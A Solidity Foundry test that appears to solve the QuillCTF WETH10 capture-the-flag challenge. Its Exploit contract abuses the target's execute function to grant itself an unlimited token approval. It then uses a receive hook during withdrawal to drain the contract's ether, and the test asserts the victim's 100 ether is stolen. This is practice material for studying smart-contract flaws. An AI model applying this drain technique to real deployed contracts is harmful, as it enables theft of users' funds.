// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/WETH10.sol";

contract WETH10Test is Test {
    WETH10 public weth10;
    Exploit public exploit;
    address public deployer;
    address public attacker;
    address public victim;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);
        victim = vm.addr(3);
        vm.deal(deployer, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);

        vm.startPrank(deployer);
        weth10 = new WETH10();
        vm.stopPrank();

        vm.startPrank(victim);
        weth10.deposit{value: 100 ether}();
        vm.stopPrank();

        vm.startPrank(attacker);
        exploit = new Exploit{value:100 ether}(weth10);
        vm.stopPrank();
    }

    function testWETH10Exploit() public {   
        // Before exploit
        uint256 beforeExploitBalweth10 = address(weth10).balance;
        assertEq(beforeExploitBalweth10, 100 ether);
        uint256 beforeExploitBal = address(exploit).balance;
        assertEq(beforeExploitBal, 100 ether);

        // Exploit
        vm.prank(attacker);
        exploit.attack();
        vm.stopPrank();

        // After exploit
        uint256 afterExploitBalweth10 = address(weth10).balance;
        assertEq(afterExploitBalweth10, 0);
        uint256 afterExploitBal = address(exploit).balance;
        assertEq(afterExploitBal, 200 ether);
    }
}

contract Exploit {
    WETH10 public weth10;
    bool attacking;

    constructor(WETH10 _weth10) payable {
        weth10 = _weth10;
    }

    function attack() external {
        weth10.execute(address(weth10), 0 ether, abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint).max));        
        
        uint256 amount;
        if (address(this).balance > address(weth10).balance) {
            amount = address(weth10).balance;
        } else {
            amount = address(this).balance;
        }
        weth10.deposit{value: amount}();
        attacking = true;
        weth10.withdrawAll();
        attacking = false;

        weth10.transferFrom(address(weth10), address(this), amount);
        weth10.withdrawAll();    
    }

    receive() external payable {
        if (attacking) {
            weth10.transfer(address(weth10), msg.value);
        }
    }
}
